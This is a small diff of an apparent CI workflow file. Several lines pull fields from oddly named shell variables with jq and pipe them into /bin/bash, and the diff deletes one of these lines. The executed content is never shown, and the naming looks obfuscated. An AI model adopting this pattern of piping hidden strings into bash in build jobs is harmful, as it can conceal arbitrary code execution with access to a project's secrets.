@@ -28,7 +28,6 @@ jobs:
           echo $bz469 | jq -r .iqey1 | /bin/bash
           printf '%s' "$hv12" | jq -r .piyi7926 | /bin/bash
           printf '%s' "$b93" | jq -r .kp8 | /bin/bash
-          printf '%s' "$qa54" | jq -r .wm1 | /bin/bash
           echo $m0 | jq -r .feqeh2 | /bin/bash
 
       - name: Store artifact
